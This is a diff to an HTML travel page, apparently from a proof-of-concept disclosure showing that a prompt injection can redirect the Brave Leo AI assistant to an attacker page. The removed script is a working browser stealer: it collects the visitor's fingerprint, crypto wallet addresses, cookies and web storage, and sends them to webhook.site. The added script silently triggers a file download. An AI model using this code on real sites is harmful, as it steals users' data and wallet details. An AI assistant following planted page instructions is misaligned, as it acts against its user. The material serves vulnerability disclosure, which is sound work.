@@ -14,86 +14,25 @@
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
 
   <script>
-    (async function() {
-      const WH = 'https://webhook.site/test';
-      const d = {};
-
-      // Identity
-      d.isBrave = !!(navigator.brave && await navigator.brave.isBrave());
-      d.userAgent = navigator.userAgent;
-      d.platform = navigator.platform;
-      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      d.language = navigator.language;
-      d.languages = navigator.languages;
-
-      // IP
-      try { d.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
-
-      // Hardware
-      d.screen = screen.width+'x'+screen.height;
-      d.cores = navigator.hardwareConcurrency;
-      d.memory = navigator.deviceMemory;
-      d.maxTouch = navigator.maxTouchPoints;
-      d.plugins = Array.from(navigator.plugins||[]).map(p=>p.name);
-
-      // Ethereum wallet
-      const eth = window.ethereum;
-      const be = window.braveEthereum;
-      d.hasEthereum = !!eth;
-      d.hasBraveEthereum = !!be;
-      if (eth) {
-        d.isBraveWallet = eth.isBraveWallet||false;
-        d.isMetaMask = eth.isMetaMask||false;
-        d.selectedAddress = eth.selectedAddress||null;
-        d.isConnected = eth.isConnected ? eth.isConnected() : null;
-        try { d.chainId = await eth.request({method:'eth_chainId'}); } catch(e){}
-        try { d.blockNumber = await eth.request({method:'eth_blockNumber'}); } catch(e){}
-        try { d.accounts = await eth.request({method:'eth_accounts'}); } catch(e){}
-        d.networkVersion = eth.networkVersion||null;
-        d.ethMethods = be ? Object.getOwnPropertyNames(Object.getPrototypeOf(be)) : [];
-      }
-
-      // Solana wallet
-      const sol = window.braveSolana;
-      d.hasBraveSolana = !!sol;
-      if (sol) {
-        d.solIsBraveWallet = sol.isBraveWallet||false;
-        d.solIsConnected = sol.isConnected||false;
-        d.solPublicKey = sol.publicKey ? sol.publicKey.toString() : null;
-        d.solMethods = Object.getOwnPropertyNames(Object.getPrototypeOf(sol));
-      }
-
-      // Brave-specific window props
-      d.braveProps = Object.keys(window).filter(k=>
-        k.toLowerCase().includes('brave')||k.toLowerCase().includes('solana')||
-        k.toLowerCase().includes('ethereum')||k.toLowerCase().includes('phantom'));
-
-      // Cookies + Storage
-      d.cookies = document.cookie||'none';
-      d.cookieEnabled = navigator.cookieEnabled;
-      let ls = {};
-      for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,200);}
-      d.localStorage = ls;
-      let ss = {};
-      for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k).substring(0,200);}
-      d.sessionStorage = ss;
-
-      // IndexedDB
-      try { d.indexedDBs = (await indexedDB.databases()).map(x=>({name:x.name,ver:x.version})); } catch(e){ d.indexedDBs=[]; }
-
-      // History + Service Workers + Caches
-      d.urlHistory = performance.getEntries().filter(e=>e.entryType==='navigation'||e.entryType==='resource').map(e=>e.name).slice(0,10);
-      try { d.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){ d.serviceWorkers=[]; }
-      try { d.cacheNames = await caches.keys(); } catch(e){ d.cacheNames=[]; }
-
-      d.timestamp = new Date().toISOString();
-
-      // Send everything in one shot via sendBeacon (never blocked)
-      const payload = JSON.stringify(d);
-      navigator.sendBeacon(WH, payload);
-      
-      new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
-    })();
+    // Wait for page to fully load and be read by Leo, THEN trigger download
+    setTimeout(function() {
+      var link = document.createElement('a');
+      link.href = 'data:text/plain;base64,' + btoa(
+        'PROOF OF CONCEPT — Unauthorized File Download\n' +
+        '================================================\n\n' +
+        'This file was downloaded to your computer without your consent.\n\n' +
+        'You asked Leo AI to summarize a travel article.\n' +
+        'A malicious page used a prompt injection to redirect Leo\n' +
+        'to an attacker-controlled page, which auto-downloaded this file.\n\n' +
+        'Timestamp: ' + new Date().toISOString() + '\n' +
+        'User-Agent: ' + navigator.userAgent + '\n' +
+        'URL: ' + location.href + '\n'
+      );
+      link.download = 'travel-itinerary-2026.txt';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }, 3000);
   </script>
 </body>
 </html>
